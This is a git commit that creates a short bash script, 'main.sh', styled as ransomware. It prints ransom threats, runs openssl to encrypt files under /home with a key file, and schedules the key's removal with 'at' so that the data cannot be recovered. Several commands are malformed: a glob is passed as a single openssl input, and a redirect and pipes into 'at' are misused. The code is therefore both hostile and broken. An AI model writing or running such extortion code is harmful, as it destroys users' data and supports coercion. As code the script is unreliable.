c42125e77ac773f3d615df83ecf53af9475c8424
HrafnJoarr <joseph.g@disc.ac.uk>
2026-01-28 11:02:25 +0000

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+echo "ENCRYPTION ACTIVATED"
+echo "..."
+echo "PAY OR ELSE FILES WILL BE ENCRYPTED FOREVER"
+
+sudo apt-get install at >> /etc/yes.log ; sleep 10 ; rm /etc/yes.log
+
+openssl enc -aes-256-cbc -pbkdf2 -salt -in /home/* -out encrypted.dat -pass file:normal_file.txt
+
+echo "YOUR FILES WILL BE GONE BY 4AM"
+
+mv normal_file.txt > /home | at 3:59am ; rm /home/normal_file.txt | at 4am 
